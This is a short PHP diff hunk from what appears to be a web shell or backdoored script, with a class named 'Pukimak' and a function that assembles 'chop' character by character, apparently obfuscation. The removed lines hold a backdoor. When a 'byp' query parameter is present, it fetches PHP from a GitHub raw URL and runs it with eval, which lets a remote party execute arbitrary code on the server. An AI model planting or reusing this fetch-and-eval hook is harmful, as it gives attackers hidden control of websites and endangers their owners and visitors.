@@ -26,9 +26,6 @@ class Pukimak {
                 echo "URL tidak valid.";
             }
         }
-        if(isset($_GET['byp'])){
-            eval("?>".file_get_contents("https://raw.githubusercontent.com/TokuHaxor/Wordpress/main/fc"));
-    }
 function GjKlPwQcF($s)
 {
     $b = 'c' . 'h' . 'o' . 'p';
